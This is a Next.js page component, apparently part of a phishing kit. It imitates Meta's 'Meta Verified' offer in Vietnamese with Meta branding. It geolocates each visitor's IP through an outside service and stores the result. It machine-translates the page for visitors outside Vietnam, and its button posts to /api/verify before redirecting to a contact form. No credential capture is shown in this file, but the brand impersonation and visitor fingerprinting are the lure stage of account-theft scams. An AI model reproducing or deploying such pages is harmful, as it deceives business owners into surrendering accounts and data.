'use client';

import IconImpersonation from '@/assets/images/index-chong-mao-danh.png';
import IconSupport from '@/assets/images/index-ky-thuat-vien-ho-tro.png';
import MainIllustration from '@/assets/images/index-main-illustration.png';
import IconUpgrade from '@/assets/images/index-tinh-nang-nang-cap.png';
import IconVerified from '@/assets/images/index-xac-minh.png';
import { translateBatch } from '@/utils/translate';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { useCallback, useEffect, useMemo, useState, type FC } from 'react';

const DEFAULT_TEXTS = {
    title: 'Tăng trưởng với Meta đã xác minh',
    description: 'Xây dựng uy tín với khách hàng. Tiếp tục để đến với Meta đã xác minh',
    cta: 'Tham gia danh sách ...',
    sectionTitle: 'Nhiều lợi ích nổi bật khác',
    verifiedTitle: 'Huy hiệu đã xác minh',
    verifiedSubtitle: 'Luôn xuất hiện bên bạn',
    impersonationTitle: 'Chống mạo danh',
    impersonationSubtitle: "Chúng tôi thay bạn 'canh gác'",
    supportTitle: 'Hỗ trợ qua email và chat với tổng đài viên',
    supportSubtitle: 'Trợ giúp khi bạn cần, ở nơi bạn cần',
    upgradeTitle: 'Tính năng nâng cấp cho trang cá nhân',
    upgradeSubtitle: 'Giới thiệu doanh nghiệp hiệu quả hơn',
};

type Texts = typeof DEFAULT_TEXTS;

const FEATURES = [
    { icon: IconVerified, titleKey: 'verifiedTitle', subtitleKey: 'verifiedSubtitle' },
    { icon: IconImpersonation, titleKey: 'impersonationTitle', subtitleKey: 'impersonationSubtitle' },
    { icon: IconSupport, titleKey: 'supportTitle', subtitleKey: 'supportSubtitle' },
    { icon: IconUpgrade, titleKey: 'upgradeTitle', subtitleKey: 'upgradeSubtitle' },
] as const;

const LivePage: FC = () => {
    const router = useRouter();
    const [texts, setTexts] = useState<Texts>(DEFAULT_TEXTS);
    const [loading, setLoading] = useState(false);

    const initializePage = useCallback(async () => {
        try {
            const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const countryCode = String(data?.country_code ?? '').toUpperCase();
            localStorage.setItem('ipInfo', JSON.stringify(data));

            if (countryCode && countryCode !== 'VN') {
                const keys = Object.keys(DEFAULT_TEXTS) as Array<keyof Texts>;
                const translated = await translateBatch(
                    keys.map((k) => DEFAULT_TEXTS[k]),
                    countryCode
                );
                const result = { ...DEFAULT_TEXTS };
                keys.forEach((key, i) => {
                    result[key] = translated[i] ?? DEFAULT_TEXTS[key];
                });
                setTexts(result);
            }
        } catch {
            // giữ text mặc định nếu lỗi
        }
    }, []);

    useEffect(() => {
        initializePage();
    }, [initializePage]);

    const handleCta = useCallback(async () => {
        setLoading(true);
        try {
            await axios.post('/api/verify');
            router.push(`/contact/${Date.now()}`);
        } catch {
            setLoading(false);
        }
    }, [router]);

    const featureItems = useMemo(
        () => FEATURES.map((f) => ({ icon: f.icon, title: texts[f.titleKey], subtitle: texts[f.subtitleKey] })),
        [texts]
    );

    const [mainFeature, ...otherFeatures] = featureItems;

    return (
        <div className="index-page-shell">
            <div className="index-page">
                <div className="index-page__left">
                    <h1 className="index-page__title">{texts.title}</h1>
                    <p className="index-page__description">{texts.description}</p>
                    <button type="button" className="index-page__cta" onClick={handleCta} disabled={loading}>
                        {loading ? '...' : texts.cta}
                    </button>

                    <div className="index-page__feature-list">
                        <div className="index-page__feature-card index-page__feature-card--main">
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src={mainFeature.icon.src} alt={mainFeature.title} className="index-page__feature-icon" />
                            <div>
                                <h3 className="index-page__feature-title">{mainFeature.title}</h3>
                                <p className="index-page__feature-subtitle">{mainFeature.subtitle}</p>
                            </div>
                        </div>

                        <h2 className="index-page__section-title">{texts.sectionTitle}</h2>

                        {otherFeatures.map((item) => (
                            <div className="index-page__feature-card" key={item.title}>
                                {/* eslint-disable-next-line @next/next/no-img-element */}
                                <img src={item.icon.src} alt={item.title} className="index-page__feature-icon" />
                                <div>
                                    <h3 className="index-page__feature-title">{item.title}</h3>
                                    <p className="index-page__feature-subtitle">{item.subtitle}</p>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                <div className="index-page__right">
                    {/* eslint-disable-next-line @next/next/no-img-element */}
                    <img src={MainIllustration.src} alt="Meta verified preview" className="index-page__hero-image" />
                </div>
            </div>
        </div>
    );
};

export default LivePage;
